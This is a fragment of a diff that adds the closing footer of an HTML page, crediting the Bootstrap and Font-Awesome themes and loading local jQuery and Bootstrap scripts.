+          <p>The theme is from <a href="http://twitter.github.com/bootstrap/">Bootstrap from Twitter <i class="icon-external-link"></i></a>,
+                     and <a href="http://fortawesome.github.com/Font-Awesome/">Font-Awesome <i class="icon-external-link"></i></a>, thanks!</p>
+        </center>
+      </footer>
+
+    </div><!--/.fluid-container-->
+
+
+    <script src="../../../../../theme/js/jquery-1.7.2.min.js"></script>
+    <script src="../../../../../theme/js/bootstrap.min.js"></script>
+  </body>
+</html>
